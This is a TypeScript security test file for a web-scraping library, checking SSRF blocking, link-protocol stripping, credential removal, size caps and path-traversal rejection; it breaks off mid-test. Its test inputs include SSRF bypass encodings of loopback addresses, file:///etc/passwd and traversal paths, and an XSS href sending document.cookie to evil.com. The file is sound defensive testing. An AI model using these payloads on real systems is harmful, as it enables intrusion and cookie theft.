import test from 'node:test';
import assert from 'node:assert/strict';
import { isPrivateHost, normalizeUrl } from '../src/core/UrlUtils.js';
import { Markdownifier } from '../src/cleaners/Markdownifier.js';
import { chunkMarkdown } from '../src/core/Chunker.js';
import { CacheManager } from '../src/core/CacheManager.js';
import { SmartFetcher } from '../src/core/SmartFetcher.js';

// ── SSRF: IPv6 zone ID stripping ──

test('isPrivateHost blocks IPv6 loopback with zone ID', () => {
    // [::1%25eth0] should be treated as [::1] (loopback)
    assert.equal(isPrivateHost('[::1%25eth0]'), true);
    assert.equal(isPrivateHost('[::1%eth0]'), true);
    assert.equal(isPrivateHost('[::%25lo]'), true);
});

// ── SSRF: IPv4-compatible IPv6 addresses ──

test('isPrivateHost blocks IPv4-compatible IPv6 for loopback', () => {
    // [::7f00:1] is the IPv4-compatible form of 127.0.0.1
    assert.equal(isPrivateHost('[::7f00:1]'), true);
});

test('isPrivateHost blocks IPv4-compatible IPv6 for private ranges', () => {
    // [::a00:1] is 10.0.0.1
    assert.equal(isPrivateHost('[::a00:1]'), true);
    // [::c0a8:1] is 192.168.0.1
    assert.equal(isPrivateHost('[::c0a8:1]'), true);
});

test('isPrivateHost allows IPv4-compatible IPv6 for public IPs', () => {
    // [::801:101] is 8.1.1.1 (public)
    assert.equal(isPrivateHost('[::801:101]'), false);
});

// ── SSRF: existing checks still work ──

test('isPrivateHost blocks standard private IPs', () => {
    assert.equal(isPrivateHost('127.0.0.1'), true);
    assert.equal(isPrivateHost('10.0.0.1'), true);
    assert.equal(isPrivateHost('192.168.1.1'), true);
    assert.equal(isPrivateHost('172.16.0.1'), true);
    assert.equal(isPrivateHost('169.254.1.1'), true);
    assert.equal(isPrivateHost('0.0.0.0'), true);
    assert.equal(isPrivateHost('localhost'), true);
    assert.equal(isPrivateHost('[::1]'), true);
    assert.equal(isPrivateHost('[::ffff:7f00:1]'), true);
});

test('isPrivateHost allows public IPs', () => {
    assert.equal(isPrivateHost('8.8.8.8'), false);
    assert.equal(isPrivateHost('1.1.1.1'), false);
    assert.equal(isPrivateHost('example.com'), false);
});

// ── Markdownifier: dangerous protocol stripping ──

test('extractAll strips javascript: URLs from links', () => {
    const md = new Markdownifier();
    const html = `<html><body>
        <a href="javascript:alert(1)">Click me</a>
        <a href="https://example.com/safe">Safe link</a>
        <a href="data:text/html,<script>alert(1)</script>">Data URL</a>
        <a href="vbscript:MsgBox('hi')">VB link</a>
        <a href="blob:http://example.com/uuid">Blob link</a>
    </body></html>`;

    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });

    // Only the safe https link should be in the extracted links array
    assert.equal(result.links.length, 1);
    assert.equal(result.links[0], 'https://example.com/safe');

    // The dangerous protocol link text should still appear (as plain text, not a link)
    assert.ok(result.markdown.includes('Click me'));
    assert.ok(result.markdown.includes('Safe link'));
});

// ── Chunker: overlap clamping ──

test('chunkMarkdown clamps overlapTokens to 50% of maxTokens', () => {
    // Create content that would require multiple chunks
    const longText = 'Word '.repeat(500); // ~500 words, ~500 tokens
    const markdown = `# Section 1\n\n${longText}\n\n# Section 2\n\n${longText}`;

    const chunks = chunkMarkdown(markdown, {
        url: 'https://example.com',
        maxTokens: 100,
        overlapTokens: 200, // Greater than maxTokens — should be clamped to 50
    });

    assert.ok(chunks.length > 0);
    // Each chunk should not exceed maxTokens by more than a reasonable margin
    for (const chunk of chunks) {
        // Allow some tolerance due to word-boundary splitting
        assert.ok(chunk.approxTokens <= 150, `Chunk too large: ${chunk.approxTokens} tokens`);
    }
});

test('chunkMarkdown works normally with valid overlap', () => {
    const text = 'Hello world. '.repeat(100);
    const markdown = `# Title\n\n${text}`;

    const chunks = chunkMarkdown(markdown, {
        url: 'https://example.com',
        maxTokens: 100,
        overlapTokens: 20,
    });

    assert.ok(chunks.length > 1);
    assert.ok(chunks.every(c => c.approxTokens > 0));
});

// ── CacheManager: NaN guard ──

test('CacheManager handles NaN ttl gracefully', () => {
    const cache = new CacheManager(NaN, NaN);
    cache.set('key', { url: 'https://example.com', content: 'test', title: 'Test' });
    const result = cache.get('key');
    assert.ok(result !== null);
    assert.equal(result!.content, 'test');
});

test('CacheManager handles Infinity ttl gracefully', () => {
    const cache = new CacheManager(Infinity, 10);
    cache.set('key', { url: 'https://example.com', content: 'test', title: 'Test' });
    const result = cache.get('key');
    // Infinity is not finite, so it falls back to default TTL (5 min)
    assert.ok(result !== null);
});

// ── SmartFetcher: maxResponseBytes hardening ──

const originalFetch = globalThis.fetch;

test('SmartFetcher caps maxResponseBytes at DEFAULT_MAX_RESPONSE_BYTES', async () => {
    // A 100-byte response with maxResponseBytes=Infinity should still work
    // (the cap prevents Infinity from bypassing the limit)
    const body = 'x'.repeat(100);
    globalThis.fetch = (async () => {
        return new Response(body, {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', {
            retries: 0,
            maxResponseBytes: Infinity,
        });
        // Should still succeed — the body is small
        assert.equal(result.html.length, 100);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

test('SmartFetcher rejects negative maxResponseBytes', async () => {
    const body = '<html><body>ok</body></html>';
    globalThis.fetch = (async () => {
        return new Response(body, {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', {
            retries: 0,
            maxResponseBytes: -1,
        });
        // Negative falls back to DEFAULT_MAX_RESPONSE_BYTES; response is small, so it succeeds
        assert.equal(result.isStaticSuccess, true);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── SmartFetcher: redirect status code handling ──

test('SmartFetcher does not follow HTTP 305 Use Proxy', async () => {
    let fetchCount = 0;
    globalThis.fetch = (async () => {
        fetchCount++;
        // Return 305 with a Location header
        return new Response('', {
            status: 305,
            headers: { 'location': 'https://proxy.example.com/' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        // 305 is not a redirect — treated as non-OK response
        assert.equal(fetchCount, 1);
        assert.equal(result.status, 305);
        assert.equal(result.isStaticSuccess, false);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Markdownifier: extractMainContent performance cap ──

test('extractMainContent handles page with many nested divs', () => {
    const md = new Markdownifier();
    // Create HTML with 500 nested divs — without cap this would be expensive
    let html = '<html><body>';
    for (let i = 0; i < 500; i++) {
        html += `<div class="level-${i}"><p>Content at level ${i}</p>`;
    }
    for (let i = 0; i < 500; i++) {
        html += '</div>';
    }
    html += '</body></html>';

    const result = md.extractAll(html, 'https://example.com', {
        extractMainContent: true,
        optimizeTokens: false,
    });

    // Should complete without hanging and produce some content
    assert.ok(result.markdown.length > 0);
});

// ── SmartFetcher: requiresJavaScript text extraction perf ──

test('SmartFetcher handles HTML with many unclosed < chars without hanging', async () => {
    // Pathological input: 10K '<' chars without matching '>'
    // Old regex-based stripping was O(n²); new indexOf-based is O(n)
    const pathological = '<'.repeat(10_000) + '<html><body><p>Real content here</p></body></html>';
    globalThis.fetch = (async () => {
        return new Response(pathological, {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const start = Date.now();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        const elapsed = Date.now() - start;
        // Should complete in well under 1 second (was seconds before fix)
        assert.ok(elapsed < 2000, `Took ${elapsed}ms — suspected O(n²)`);
        assert.equal(result.status, 200);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── AgentCrawl: URL length validation ──

test('scrape rejects excessively long URLs', async () => {
    const { AgentCrawl } = await import('../src/AgentCrawl.js');
    const longUrl = 'https://example.com/' + 'a'.repeat(10000);
    const result = await AgentCrawl.scrape(longUrl);
    assert.equal(result.content, '');
    assert.ok(result.metadata?.error?.includes('too long'));
});

// ── Schema: maxResponseBytes cap ──

test('schema rejects maxResponseBytes above 50MB', async () => {
    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
    assert.throws(
        () => ScrapeOptionsSchema.parse({
            url: 'https://example.com',
            maxResponseBytes: 100 * 1024 * 1024, // 100MB
        }),
    );
    // 50MB should be accepted
    assert.doesNotThrow(
        () => ScrapeOptionsSchema.parse({
            url: 'https://example.com',
            maxResponseBytes: 50 * 1024 * 1024,
        }),
    );
});

// ── Round 4: crawl() URL length check ──

test('crawl rejects excessively long start URLs', async () => {
    const { AgentCrawl } = await import('../src/AgentCrawl.js');
    const longUrl = 'https://example.com/' + 'x'.repeat(10000);
    const result = await AgentCrawl.crawl(longUrl);
    assert.equal(result.pages.length, 0);
    assert.ok(result.errors[0]?.error.includes('too long'));
});

// ── Round 4: OG metadata cap ──

test('extractAll caps OG metadata entries', () => {
    const md = new Markdownifier();
    // Generate 200 unique og: tags — should be capped at 100
    let metaTags = '';
    for (let i = 0; i < 200; i++) {
        metaTags += `<meta property="og:custom${i}" content="value${i}">`;
    }
    const html = `<html><head>${metaTags}</head><body><p>Content</p></body></html>`;
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });

    const ogKeys = result.structured?.openGraph ? Object.keys(result.structured.openGraph) : [];
    assert.ok(ogKeys.length <= 100, `OG entries: ${ogKeys.length}, expected <= 100`);
    assert.ok(ogKeys.length > 0);
});

// ── Round 4: DiskKv write size cap ──

test('DiskKv.set rejects entries exceeding MAX_FILE_BYTES', async () => {
    const { DiskKv } = await import('../src/core/DiskKv.js');
    const tmpDir = `/tmp/agent-crawl-diskkvtest-${Date.now()}`;
    const kv = new DiskKv<string>({ dir: tmpDir, ttlMs: 60_000, maxEntries: 10 });

    // Try to write a value way too large (> 50MB when serialized)
    const hugeValue = 'x'.repeat(60 * 1024 * 1024);
    await assert.rejects(
        () => kv.set('huge', hugeValue),
        /too large/i,
    );

    // Clean up
    const fs = await import('node:fs');
    await fs.promises.rm(tmpDir, { recursive: true, force: true }).catch(() => {});
});

// ── Round 5: extractLinks() dangerous protocol check ──

test('extractLinks strips dangerous protocol URLs', () => {
    const md = new Markdownifier();
    const html = `<html><body>
        <a href="javascript:alert(1)">XSS</a>
        <a href="https://example.com/page">Safe</a>
        <a href="data:text/html,x">Data</a>
    </body></html>`;
    const links = md.extractLinks(html, 'https://example.com');
    assert.equal(links.length, 1);
    assert.equal(links[0], 'https://example.com/page');
});

// ── Round 6: normalizeUrl strips userinfo ──

test('normalizeUrl strips username and password from URLs', () => {
    const result = normalizeUrl('https://user:pass@example.com/path');
    assert.ok(!result.includes('user'));
    assert.ok(!result.includes('pass'));
    assert.ok(result.includes('example.com/path'));
});

test('normalizeUrl strips username-only from URLs', () => {
    const result = normalizeUrl('https://admin@example.com/');
    assert.ok(!result.includes('admin'));
    assert.ok(result.startsWith('https://example.com'));
});

// ── Round 6: isPrivateHost empty hostname ──

test('isPrivateHost blocks empty hostname', () => {
    assert.equal(isPrivateHost(''), true);
});

test('isPrivateHost blocks hostname that is just a dot', () => {
    assert.equal(isPrivateHost('.'), true);
});

test('isPrivateHost blocks [::0] variants', () => {
    assert.equal(isPrivateHost('[::0]'), true);
    assert.equal(isPrivateHost('[::00]'), true);
    assert.equal(isPrivateHost('[::000]'), true);
    assert.equal(isPrivateHost('::0'), true);
});

// ── Round 6: SmartFetcher strips userinfo ──

test('SmartFetcher strips userinfo from URLs before fetching', async () => {
    let capturedUrl = '';
    globalThis.fetch = (async (url: string | URL | Request) => {
        capturedUrl = typeof url === 'string' ? url : url.toString();
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        await fetcher.fetch('https://user:secret@example.com/page', { retries: 0 });
        assert.ok(!capturedUrl.includes('user'));
        assert.ok(!capturedUrl.includes('secret'));
        assert.ok(capturedUrl.includes('example.com/page'));
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 6: SmartFetcher strips userinfo from redirect URLs ──

test('SmartFetcher strips userinfo from redirect target URLs', async () => {
    let fetchCount = 0;
    let capturedUrls: string[] = [];
    globalThis.fetch = (async (url: string | URL | Request) => {
        fetchCount++;
        capturedUrls.push(typeof url === 'string' ? url : url.toString());
        if (fetchCount === 1) {
            return new Response('', {
                status: 302,
                headers: { 'location': 'https://creds:leak@example.com/redirected' },
            });
        }
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/start', { retries: 0 });
        assert.equal(fetchCount, 2);
        // The second request should NOT contain credentials
        assert.ok(!capturedUrls[1].includes('creds'));
        assert.ok(!capturedUrls[1].includes('leak'));
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 6: SmartFetcher caps response headers ──

test('SmartFetcher caps stored response header count', async () => {
    const headers = new Headers();
    for (let i = 0; i < 300; i++) {
        headers.append(`x-custom-${i}`, `value-${i}`);
    }
    globalThis.fetch = (async () => {
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers,
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        const headerCount = Object.keys(result.headers).length;
        assert.ok(headerCount <= 200, `Expected <= 200 headers, got ${headerCount}`);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 6: CacheManager structuredClone error handling ──

test('CacheManager.get handles corrupted cache entries gracefully', () => {
    const cache = new CacheManager();
    // Manually inject a non-cloneable value
    const internal = (cache as any).cache;
    internal.set('bad', {
        data: { url: 'test', content: 'test', title: 'test', special: () => {} },
        timestamp: Date.now(),
    });
    // get should return null instead of throwing
    const result = cache.get('bad');
    assert.equal(result, null);
});

test('CacheManager.set handles non-cloneable data gracefully', () => {
    const cache = new CacheManager();
    // Should not throw
    const dataWithFn = { url: 'test', content: 'test', title: 'test', fn: () => {} } as any;
    cache.set('key', dataWithFn);
    // Since clone failed, the entry should not be cached
    const result = cache.get('key');
    assert.equal(result, null);
});

// ── Round 6: Schema validation hardening ──

test('schema rejects path traversal in cache dir', async () => {
    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
    assert.throws(
        () => ScrapeOptionsSchema.parse({
            url: 'https://example.com',
            cache: { dir: '../../../etc/sensitive' },
        }),
    );
});

test('schema rejects path traversal in crawlState dir', async () => {
    const { CrawlOptionsSchema } = await import('../src/schemas.js');
    assert.throws(
        () => CrawlOptionsSchema.parse({
            url: 'https://example.com',
            crawlState: { dir: '../../etc/passwd' },
        }),
    );
});

test('schema enforces URL length limit', async () => {
    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
    const longUrl = 'https://example.com/' + 'a'.repeat(8200);
    assert.throws(
        () => ScrapeOptionsSchema.parse({ url: longUrl }),
    );
});

test('schema validates crawlState id format', async () => {
    const { CrawlOptionsSchema } = await import('../src/schemas.js');
    // Valid ID
    assert.doesNotThrow(
        () => CrawlOptionsSchema.parse({
            url: 'https://example.com',
            crawlState: { id: 'my-crawl_123' },
        }),
    );
    // Invalid ID (path traversal attempt)
    assert.throws(
        () => CrawlOptionsSchema.parse({
            url: 'https://example.com',
            crawlState: { id: '../../../etc' },
        }),
    );
});

test('schema caps chunking maxTokens', async () => {
    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
    assert.throws(
        () => ScrapeOptionsSchema.parse({
            url: 'https://example.com',
            chunking: { maxTokens: 200_000 },
        }),
    );
    assert.doesNotThrow(
        () => ScrapeOptionsSchema.parse({
            url: 'https://example.com',
            chunking: { maxTokens: 100_000 },
        }),
    );
});

// ── Round 7: cleanForLLM pipe-line ReDoS fix ──

test('cleanForLLM handles long pipe-lines without hanging (ReDoS fix)', () => {
    const md = new Markdownifier();
    // Create a long line of pipes and spaces — old regex was O(n²)
    const pipeHell = '| '.repeat(5000) + '|';
    const html = `<html><body><p>${pipeHell}</p></body></html>`;
    const start = Date.now();
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 5000, `cleanForLLM took ${elapsed}ms — suspected ReDoS`);
    // The pipe-only line should be removed
    assert.ok(!result.markdown.includes(pipeHell));
});

// ── Round 7: title length cap ──

test('extractAll caps extremely long titles', () => {
    const md = new Markdownifier();
    const longTitle = 'A'.repeat(10_000);
    const html = `<html><head><title>${longTitle}</title></head><body><p>Content</p></body></html>`;
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
    assert.ok(result.title.length <= 2000, `Title length ${result.title.length} exceeds cap`);
});

// ── Round 7: SmartFetcher blocks dangerous request headers ──

test('SmartFetcher filters dangerous user-supplied headers', async () => {
    let capturedHeaders: Record<string, string> = {};
    globalThis.fetch = (async (_url: any, init?: any) => {
        capturedHeaders = init?.headers || {};
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        await fetcher.fetch('https://example.com/', {
            retries: 0,
            headers: {
                'Host': 'evil.com',
                'Transfer-Encoding': 'chunked',
                'X-Custom': 'safe-value',
            },
        });
        // Host and Transfer-Encoding should be filtered out
        assert.equal(capturedHeaders['Host'], undefined);
        assert.equal(capturedHeaders['Transfer-Encoding'], undefined);
        // Custom header should pass through
        assert.equal(capturedHeaders['X-Custom'], 'safe-value');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 7: normalizeUrl output length cap ──

test('normalizeUrl throws on output exceeding 8192 chars', () => {
    // Construct a URL with a very long query string
    const longQuery = 'a='.concat('x'.repeat(8200));
    assert.throws(
        () => normalizeUrl(`https://example.com/?${longQuery}`),
        /maximum length/,
    );
});

// ── Round 7: DiskKv byte-accurate size check ──

test('DiskKv.set uses byte length not char length for size check', async () => {
    const { DiskKv } = await import('../src/core/DiskKv.js');
    const tmpDir = `/tmp/agent-crawl-bytetest-${Date.now()}`;
    const kv = new DiskKv<string>({ dir: tmpDir, ttlMs: 60_000, maxEntries: 10 });

    // Multi-byte chars: each emoji is 4 bytes but 1-2 chars
    // This should be checked as bytes, not chars
    const smallValue = 'hello';
    await kv.set('small', smallValue); // should succeed
    const result = await kv.get('small');
    assert.equal(result, smallValue);

    // Clean up
    const fs = await import('node:fs');
    await fs.promises.rm(tmpDir, { recursive: true, force: true }).catch(() => {});
});

// ── Round 8: isPrivateHost blocks reserved TLDs ──

test('isPrivateHost blocks RFC 6761 reserved TLDs', () => {
    assert.equal(isPrivateHost('evil.localhost'), true);
    assert.equal(isPrivateHost('foo.test'), true);
    assert.equal(isPrivateHost('bar.invalid'), true);
    assert.equal(isPrivateHost('baz.example'), true);
    assert.equal(isPrivateHost('sub.domain.localhost'), true);
    // Non-reserved TLDs should pass
    assert.equal(isPrivateHost('example.com'), false);
    assert.equal(isPrivateHost('mysite.org'), false);
});

// ── Round 8: OG metadata value length cap ──

test('extractAll caps individual OG value lengths', () => {
    const md = new Markdownifier();
    const longValue = 'V'.repeat(10_000);
    const html = `<html><head><meta property="og:description" content="${longValue}"></head><body>Content</body></html>`;
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
    const desc = result.structured?.openGraph?.['og:description'];
    assert.ok(desc !== undefined);
    assert.ok(desc!.length <= 4096, `OG value length ${desc!.length} exceeds cap`);
});

// ── Round 8: canonical URL length cap ──

test('extractAll drops excessively long canonical URLs', () => {
    const md = new Markdownifier();
    const longCanonical = 'https://example.com/' + 'a'.repeat(9000);
    const html = `<html><head><link rel="canonical" href="${longCanonical}"></head><body>Content</body></html>`;
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
    assert.equal(result.structured?.canonicalUrl, undefined);
});

// ── Round 6: crawl over-maxDepth visited tracking ──

test('crawl marks over-maxDepth URLs as visited to prevent re-queuing', async () => {
    const { AgentCrawl } = await import('../src/AgentCrawl.js');

    const originalScrape = AgentCrawl.scrape.bind(AgentCrawl);
    const scrapedUrls: string[] = [];

    (AgentCrawl as any).scrape = async (url: string, config?: any) => {
        scrapedUrls.push(url);
        // Page at depth 0 links to /deep (would be depth 1)
        // /deep links back to itself (would be re-queued if not marked visited)
        if (url === 'https://example.com/') {
            return {
                url,
                content: 'root',
                title: 'root',
                links: ['https://example.com/deep'],
                metadata: { status: 200 },
            };
        }
        return {
            url,
            content: 'deep',
            title: 'deep',
            links: ['https://example.com/deep'],
            metadata: { status: 200 },
        };
    };

    try {
        const result = await AgentCrawl.crawl('https://example.com/', {
            maxDepth: 0, // Only crawl start URL, not links
            maxPages: 10,
            concurrency: 1,
        });

        // Should only scrape the start URL since maxDepth=0
        assert.equal(scrapedUrls.length, 1);
        assert.equal(scrapedUrls[0], 'https://example.com/');
        assert.equal(result.totalPages, 1);
    } finally {
        (AgentCrawl as any).scrape = originalScrape;
    }
});

// ── Round 9: file: protocol blocked in links and markdown ──

test('extractAll strips file: protocol URLs from links', () => {
    const md = new Markdownifier();
    const html = `<html><body>
        <a href="file:///etc/passwd">Secret</a>
        <a href="https://example.com/ok">OK</a>
    </body></html>`;
    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
    assert.equal(result.links.length, 1);
    assert.equal(result.links[0], 'https://example.com/ok');
    // The link text should appear but not as a clickable link
    assert.ok(result.markdown.includes('Secret'));
});

test('extractLinks strips file: protocol URLs', () => {
    const md = new Markdownifier();
    const html = `<html><body>
        <a href="file:///tmp/sensitive">Local</a>
        <a href="https://example.com/page">Page</a>
    </body></html>`;
    const links = md.extractLinks(html, 'https://example.com');
    assert.equal(links.length, 1);
    assert.equal(links[0], 'https://example.com/page');
});

// ── Round 9: SmartFetcher error message truncation ──

test('SmartFetcher truncates long error messages', async () => {
    const longMsg = 'E'.repeat(2000);
    globalThis.fetch = (async () => {
        throw new Error(longMsg);
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        assert.ok(result.error!.length <= 510, `Error length ${result.error!.length} exceeds cap`);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 10: SmartFetcher caps user-supplied header values ──

test('SmartFetcher caps user-supplied header value length', async () => {
    let capturedHeaders: Record<string, string> = {};
    globalThis.fetch = (async (_url: any, init?: any) => {
        capturedHeaders = init?.headers || {};
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        const hugeValue = 'X'.repeat(20_000);
        await fetcher.fetch('https://example.com/', {
            retries: 0,
            headers: { 'X-Big': hugeValue },
        });
        assert.ok(capturedHeaders['X-Big'].length <= 8192, `Header value ${capturedHeaders['X-Big'].length} exceeds 8192`);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Round 10: SmartFetcher uses Object.create(null) for safeUserHeaders ──

test('SmartFetcher safeUserHeaders is prototype-pollution-safe', async () => {
    let capturedHeaders: Record<string, string> = {};
    globalThis.fetch = (async (_url: any, init?: any) => {
        capturedHeaders = init?.headers || {};
        return new Response('<html><body>ok</body></html>', {
            status: 200,
            headers: { 'content-type': 'text/html' },
        });
    }) as typeof fetch;

    try {
        const fetcher = new SmartFetcher();
        await fetcher.fetch('https://example.com/', {
            retries: 0,
            headers: { '__proto__': 'polluted', 'X-Safe': 'ok' } as any,
        });
        // __proto__ should not pollute Object.prototype
        assert.equal((Object.prototype as any).polluted, undefined);
        assert.equal(capturedHeaders['X-Safe'], 'ok');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ════════════════════════════════════════════════════════════════════
// ADVERSARIAL EXPLOIT TESTS — each attempts an attack; passing = defended
// ════════════════════════════════════════════════════════════════════

// ── SSRF bypass attempts via isPrivateHost ──

test('SSRF: dotted-decimal loopback bypass attempts', () => {
    // Various representations of 127.0.0.1 that attackers try
    assert.equal(isPrivateHost('2130706433'), true);       // decimal
    assert.equal(isPrivateHost('017700000001'), false);     // octal as pure digits — Node doesn't resolve this, parseIPv4 rejects leading zeros
    assert.equal(isPrivateHost('0x7f000001'), true);        // hex
    assert.equal(isPrivateHost('0177.0.0.1'), true);        // octal per-octet
    assert.equal(isPrivateHost('0x7f.0.0.1'), true);        // hex per-octet
    assert.equal(isPrivateHost('127.0.0.1.'), true);        // trailing dot
    assert.equal(isPrivateHost('127.0.0.1..'), false);      // double dot — not a valid hostname, not private pattern
});

test('SSRF: IPv6 encoding bypass attempts', () => {
    assert.equal(isPrivateHost('[0:0:0:0:0:0:0:1]'), true);    // expanded loopback
    assert.equal(isPrivateHost('[0000:0000:0000:0000:0000:0000:0000:0001]'), true); // fully expanded
    assert.equal(isPrivateHost('[::ffff:127.0.0.1]'), true);    // v4-mapped dotted
    assert.equal(isPrivateHost('[::ffff:7f00:1]'), true);       // v4-mapped hex
    assert.equal(isPrivateHost('[::ffff:a00:1]'), true);        // v4-mapped 10.0.0.1
    assert.equal(isPrivateHost('[::1%2525eth0]'), true);        // double-encoded zone ID
    assert.equal(isPrivateHost('[fd00::1]'), true);             // ULA
    assert.equal(isPrivateHost('[fe80::1]'), true);             // link-local
});

test('SSRF: reserved TLD bypass attempts', () => {
    assert.equal(isPrivateHost('anything.localhost'), true);
    assert.equal(isPrivateHost('LOCALHOST'), true);          // case variation
    assert.equal(isPrivateHost('a.b.c.localhost'), true);    // deep subdomain
    assert.equal(isPrivateHost('evil.test'), true);
    assert.equal(isPrivateHost('evil.invalid'), true);
    assert.equal(isPrivateHost('evil.example'), true);
    assert.equal(isPrivateHost('evil.local'), true);
    assert.equal(isPrivateHost('evil.internal'), true);
    // These should NOT be blocked
    assert.equal(isPrivateHost('localhost.com'), false);     // real domain, not .localhost TLD
    assert.equal(isPrivateHost('notlocalhost'), false);
    assert.equal(isPrivateHost('mytest.com'), false);        // .com, not .test
});

// ── SSRF via SmartFetcher redirect chain ──

test('SSRF: redirect to 127.0.0.1 blocked', async () => {
    globalThis.fetch = (async (url: string | URL | Request) => {
        const u = typeof url === 'string' ? url : url.toString();
        if (u.includes('example.com')) {
            return new Response('', {
                status: 302,
                headers: { 'location': 'http://127.0.0.1/admin' },
            });
        }
        // If we reach here, SSRF defense failed
        return new Response('SSRF BYPASSED', { status: 200, headers: { 'content-type': 'text/html' } });
    }) as typeof fetch;
    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
        assert.notEqual(result.html, 'SSRF BYPASSED');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

test('SSRF: redirect to [::1] blocked', async () => {
    globalThis.fetch = (async (url: string | URL | Request) => {
        const u = typeof url === 'string' ? url : url.toString();
        if (u.includes('example.com')) {
            return new Response('', {
                status: 307,
                headers: { 'location': 'http://[::1]:8080/secret' },
            });
        }
        return new Response('SSRF BYPASSED', { status: 200, headers: { 'content-type': 'text/html' } });
    }) as typeof fetch;
    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
    } finally {
        globalThis.fetch = originalFetch;
    }
});

test('SSRF: redirect to javascript: protocol blocked', async () => {
    globalThis.fetch = (async () => {
        return new Response('', {
            status: 301,
            headers: { 'location': 'javascript:alert(1)' },
        });
    }) as typeof fetch;
    try {
        const fetcher = new SmartFetcher();
        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
        // Must be blocked — either by protocol check or invalid redirect parse
        assert.ok(
            result.error?.includes('protocol blocked') ||
            result.error?.includes('Invalid redirect') ||
            result.error?.includes('non-HTTP'),
            `Expected redirect block, got: ${result.error}`,
        );
        assert.equal(result.html, '');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

// ── Credential injection attempts ──

test('credential injection: userinfo in initial URL stripped', async () => {
    let capturedUrl = '';
    globalThis.fetch = (async (url: string | URL | Request) => {
        capturedUrl = typeof url === 'string' ? url : url.toString();
        return new Response('<html>ok</html>', { status: 200, headers: { 'content-type': 'text/html' } });
    }) as typeof fetch;
    try {
        const fetcher = new SmartFetcher();
        await fetcher.fetch('https://admin:hunter2@target.com/api', { retries: 0 });
        assert.ok(!capturedUrl.includes('admin'), 'Username leaked');
        assert.ok(!capturedUrl.includes('hunter2'), 'Password leaked');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

test('credential injection: userinfo in redirect stripped', async () => {
    let fetchCount = 0;
    let secondUrl = '';
    globalThis.fetch = (async (url: string | URL | Request) => {
        fetchCount++;
        if (fetchCount === 1) {
            return new Response('', { status: 302, headers: { 'location': 'https://leaked:creds@target.com/redir' } });
        }
        secondUrl = typeof url === 'string' ? url : url.toString();
        return new Response('<html>ok</html>', { status: 200, headers: { 'content-type': 'text/html' } });
    }) as typeof fetch;
    try {
        const fetcher = new SmartFetcher();
        await fetcher.fetch('https://target.com/', { retries: 0 });
        assert.ok(!secondUrl.includes('leaked'), 'Redirect username leaked');
        assert.ok(!secondUrl.includes('creds'), 'Redirect password leaked');
    } finally {
        globalThis.fetch = originalFetch;
    }
});

test('credential injection: userinfo stripped from normalizeUrl output', () => {
    const n = normalizeUrl('https://secret:key@api.stripe.com/v1/charges');
    assert.ok(!n.includes('secret'));
    assert.ok(!n.includes('key'));
    assert.ok(n.includes('api.stripe.com/v1/charges'));
});

// ── XSS / markdown injection via HTML content ──

test('XSS: javascript: href stripped from markdown output', () => {
    const md = new Markdownifier();
    const html = '<html><body><a href="javascript:fetch(&#x27;https://evil.com?c=&#x27;+document.cookie)">Click</a></body></html>';
    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
